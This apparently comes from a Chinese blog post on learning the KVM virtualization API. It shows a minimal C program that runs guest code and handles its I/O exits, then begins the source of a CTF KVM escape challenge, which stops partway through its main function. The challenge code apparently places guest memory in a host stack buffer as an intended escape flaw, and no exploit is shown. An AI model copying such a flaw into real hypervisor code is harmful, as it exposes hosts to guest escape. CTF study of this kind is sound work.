          <h1 id="KVM虚拟化学习-amp-kvm题目复现"><a href="#KVM虚拟化学习-amp-kvm题目复现" class="headerlink" title="KVM虚拟化学习&amp;kvm题目复现"></a>KVM虚拟化学习&amp;kvm题目复现</h1><h2 id="kvm虚拟化学习"><a href="#kvm虚拟化学习" class="headerlink" title="kvm虚拟化学习"></a>kvm虚拟化学习</h2><p>对我而言现在学习这个还是比较吃力的，涉及很复杂的一些理论知识，看的云里雾里(多半没看懂)，而且资料也不是很多，看了一两天大概看懂了kvm的整个运行过程，虽然学的很浅，但是在这里记录一下。</p>
<h3 id="kvm概述以及使用"><a href="#kvm概述以及使用" class="headerlink" title="kvm概述以及使用"></a>kvm概述以及使用</h3><p>kvm是运行在Linux内核中的硬件虚拟化管理模块，用户态的程序可以通过kvm暴露的用户态接口使用硬件虚拟化的功能,我们可以通过规定的API以及数据结构完成CPU虚拟化，内存虚拟化以及IO虚拟化,以此模拟完整的虚拟环境。</p>
<p>先写一段我们想要执行的代码,其中比较重要的是<code>out</code>指令，这个指令就是把al保存的数据发送到dx储存的io端口上去，CPU通常通过读写设备寄存器的方式和设备进行通信，访问设备寄存器的方式一共有两种，一种是内存映射I/O(MMIO)，一种是端口映射I/O(PMIO),MMIO是将设备寄存器直接映射到内存空间上并且拥有独立的地址，CPU可以直接通过读写内存指令即可通信，而PMIO给每个设备分配对应的端口号，然后通过专门的端口操作指令(out/in)和设备通信，而0x3f8则是模拟的一个端口号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">add al,&#x27;0&#x27;</span><br><span class="line">mov dx, 0x3f8</span><br><span class="line">out dx, al</span><br><span class="line">hlt</span><br></pre></td></tr></table></figure>

<p>然后把这个汇编给编译了再得到二进制数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ nasm huibian.asm -o huibian</span><br><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ hexdump -C huibian</span><br><span class="line">00000000  b0 01 04 30 ba f8 03 ee  f4                       |...0.....|</span><br><span class="line">00000009</span><br></pre></td></tr></table></figure>

<p>然后把这个shellcode存储到一个数据里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> code[]=&#123;</span><br><span class="line">     <span class="number">0xb0</span>,<span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x30</span>, <span class="number">0xba</span>, <span class="number">0xf8</span>, <span class="number">0x03</span>, <span class="number">0xee</span>,<span class="number">0xf4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着真正开始利用kvm的接口来创建虚拟机然后运行这段shellcode.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kvm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">uint8_t</span> code[]=&#123;</span><br><span class="line">         <span class="number">0xb0</span>,<span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x30</span>, <span class="number">0xba</span>, <span class="number">0xf8</span>, <span class="number">0x03</span>, <span class="number">0xee</span>,<span class="number">0xf4</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//打开/dev/kvm,获得kvm的句柄</span></span><br><span class="line">    <span class="keyword">int</span> kvm=open(<span class="string">&quot;/dev/kvm&quot;</span>,O_RDWR|O_CLOEXEC);</span><br><span class="line">    <span class="comment">//早起的kvm的API是不稳定的，所以得检查一下版本，如果是</span></span><br><span class="line">    <span class="comment">//12那就没问题</span></span><br><span class="line">    ret=ioctl(kvm,KVM_GET_API_VERSION,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_API_VERSION get fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ret!=<span class="number">12</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_API_VERSION is not 12&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建一个虚拟机(vm),他代表了一个模拟系统相关的所有内容，包括</span></span><br><span class="line">    <span class="comment">//内存和一个或者多个CPU，</span></span><br><span class="line">    <span class="keyword">int</span> vmfd=ioctl(kvm,KVM_CREATE_VM,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(vmfd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_CREATE_VM fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//为vm配置“物理”内存</span></span><br><span class="line">    <span class="keyword">void</span> *mem=mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!mem)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;mmap mem fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(mem,code,<span class="keyword">sizeof</span>(code));</span><br><span class="line">    <span class="comment">//这个数据结构规定了客户物理地址和宿主进程的映射关系,是比较重要的</span></span><br><span class="line">    <span class="comment">//其中guest_phys_addr指定了从guest看到的&quot;物理&quot;地址，而userspace_addr</span></span><br><span class="line">    <span class="comment">//是宿主进程的虚拟地址，可以看出这个是个线性映射，把mem映射到guest的0x1000</span></span><br><span class="line">    <span class="comment">//的“物理”地址上，所以mem和guest的0x1000指向到真实物理地址是一模一样的，所以guest修改</span></span><br><span class="line">    <span class="comment">//他的内存是可以影响到宿主进程的，这也是逃逸的漏洞点。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span>=</span>&#123;</span><br><span class="line">        .slot=<span class="number">0</span>,</span><br><span class="line">        .guest_phys_addr=<span class="number">0x1000</span>,</span><br><span class="line">        .memory_size=<span class="number">0x1000</span>,</span><br><span class="line">        .userspace_addr=(<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//然后设置vm的内存区域</span></span><br><span class="line">    ret=ioctl(vmfd,KVM_SET_USER_MEMORY_REGION,&amp;region);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_SET_USER_MEMORY_REGION fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//截至目前已经拥有了vm和他所对应的内存，里面包含了代码，要想执行这段代码还得模拟</span></span><br><span class="line">    <span class="comment">//一个虚拟CPU(VCPU),一个虚拟cpu代表了一个模拟CPU的状态，包括处理器寄存器和其他</span></span><br><span class="line">    <span class="comment">//执行状态,kvm提供一个vcpu的句柄</span></span><br><span class="line">    <span class="keyword">int</span> vcpufd=ioctl(vmfd,KVM_CREATE_VCPU,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(vcpufd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_CREATE_VCPU fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//每个vcpu都得关联一个struct kvm_run数据结构，用于在vm和宿主进程(我理解为虚拟机监听器)</span></span><br><span class="line">    <span class="comment">//传递有关cpu的信息，特别是当vmexit的时候，kvm_run讲包含有关他停止的信息，可以根据这个</span></span><br><span class="line">    <span class="comment">//信息做相应的处理操作</span></span><br><span class="line">    <span class="keyword">size_t</span> kvm_run_size=ioctl(kvm,KVM_GET_VCPU_MMAP_SIZE,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(!kvm_run_size)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_VCPU_MMAP_SIZE fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//然后将kvm_run和vcpu关联</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_run</span> *<span class="title">run</span>=</span>mmap(<span class="literal">NULL</span>,kvm_run_size,PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//在执行代码之前还需要设置vcpu的寄存器的初始状态，寄存器分为标准寄存器和特殊寄存器，标准</span></span><br><span class="line">    <span class="comment">//寄存器指的是通用寄存器以及指针和标志，kvm中采用struct kvm_regs数据结构与其对应，特殊寄存器</span></span><br><span class="line">    <span class="comment">//主要包括段寄存器和控制寄存器,kvm中采用struct kvm_sregs数据结构与其对应</span></span><br><span class="line">    <span class="comment">//特殊寄存器中，我们只需要设置cs寄存器即可</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_sregs</span> <span class="title">sregs</span>;</span></span><br><span class="line">    ret=ioctl(vcpufd,KVM_GET_SREGS,&amp;sregs);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_SREGS fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">    sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">    ret=ioctl(vcpufd,KVM_SET_SREGS,&amp;sregs);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_SET_SREGS fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置标准寄存器，其中比较重要的是rip和rflags寄存器，rip指向</span></span><br><span class="line">    <span class="comment">//code存放的地址，rflags指定为2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span>=</span></span><br><span class="line">    &#123;</span><br><span class="line">        .rip=<span class="number">0x1000</span>,</span><br><span class="line">        .rax=<span class="number">1</span>,</span><br><span class="line">        .rflags=<span class="number">0x2</span>,</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    ret=ioctl(vcpufd,KVM_SET_REGS,&amp;regs);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_SET_REGS fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//此时vm拥有了内存和VCPU，我们可以使用KVM_run选项让vcpu来运行自己的</span></span><br><span class="line">    <span class="comment">//code了</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ret=ioctl(vcpufd,KVM_RUN,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;KVM_RUN fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (run-&gt;exit_reason)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_HLT:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_HLT hahaha&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_IO:</span><br><span class="line">            <span class="keyword">if</span>(</span><br><span class="line">                run-&gt;io.direction==KVM_EXIT_IO_OUT&amp;&amp;</span><br><span class="line">                run-&gt;io.size==<span class="number">1</span>&amp;&amp;</span><br><span class="line">                run-&gt;io.port==<span class="number">0x3f8</span>&amp;&amp;</span><br><span class="line">                run-&gt;io.count==<span class="number">1</span></span><br><span class="line">            )&#123;</span><br><span class="line">                <span class="built_in">putchar</span>(*(( (<span class="keyword">char</span> *)run)+run-&gt;io.data_offset));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_IO fail&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ ./kvmpwn </span><br><span class="line">1KVM_EXIT_HLT hahaha</span><br></pre></td></tr></table></figure>

<p>符合预期</p>
<p>验证一下guest被分配的内存是否是宿主进程给他的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">add al,&#x27;0&#x27;</span><br><span class="line">mov dx, 0x3f8</span><br><span class="line">out dx, al</span><br><span class="line">mov al,0x20</span><br><span class="line">mov word [0x1000+0x20],&#x27;2&#x27;</span><br><span class="line">hlt</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_HLT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,((<span class="keyword">char</span> *)mem)+<span class="number">0x20</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_HLT hahaha&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ ./kvmpwn</span><br><span class="line">12</span><br><span class="line">KVM_EXIT_HLT hahaha</span><br></pre></td></tr></table></figure>

<p>符合预期</p>
<h3 id="kvm深入学习"><a href="#kvm深入学习" class="headerlink" title="kvm深入学习"></a>kvm深入学习</h3><p>​    上面只是比较简单的kvm使用方法，guest并没有开虚拟内存映射，直接使用的是他的”物理地址”，所以比较好理解，我找见了conf2020的一道kvm源码，他整了很多花活，我稍微改了改让他能够跑起来，接下来的任务就是搞懂这个源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kvm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* CR0 bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_PE 1u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_MP (1U &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_EM (1U &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_TS (1U &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_ET (1U &lt;&lt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_NE (1U &lt;&lt; 5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_WP (1U &lt;&lt; 16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_AM (1U &lt;&lt; 18)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_NW (1U &lt;&lt; 29)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_CD (1U &lt;&lt; 30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_PG (1U &lt;&lt; 31)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR4_PAE (1U &lt;&lt; 5)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFER_LME (1U &lt;&lt; 8) <span class="comment">// Long mode enable</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFER_LMA (1U &lt;&lt; 10) <span class="comment">// long mode active</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_n</span><span class="params">(<span class="keyword">int</span> count, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> to_read = count;</span><br><span class="line">    <span class="keyword">char</span> *dst_ptr = dst;</span><br><span class="line">    <span class="keyword">while</span> (to_read &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> read_res = read(<span class="number">0</span>, dst_ptr, to_read);</span><br><span class="line">        to_read -= read_res;</span><br><span class="line">        dst_ptr += read_res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_kvm_segment</span><span class="params">(struct kvm_segment *v1,struct kvm_segment *v2)</span></span>&#123;</span><br><span class="line">        v1-&gt;base =v2-&gt;base;</span><br><span class="line">        v1-&gt;limit = v2-&gt;limit;</span><br><span class="line">        v1-&gt;selector =v2-&gt;selector;</span><br><span class="line">        v1-&gt;present =v2-&gt;present;</span><br><span class="line">        v1-&gt;type =v2-&gt;type; <span class="comment">/* Code: execute, read, accessed */</span></span><br><span class="line">        v1-&gt;dpl = v2-&gt;dpl;</span><br><span class="line">        v1-&gt;db =v2-&gt;db;</span><br><span class="line">        v1-&gt;s =v2-&gt;s; <span class="comment">/* Code/data */</span></span><br><span class="line">        v1-&gt;l = v2-&gt;l;</span><br><span class="line">        v1-&gt;g =v2-&gt;g; <span class="comment">/* 4KB granularity */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> guest_mem[<span class="number">0x8000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>);</span><br><span class="line">    <span class="keyword">char</span> *aligned_guest_mem = guest_mem + (<span class="number">4096</span> - (<span class="keyword">size_t</span>)guest_mem % <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">    <span 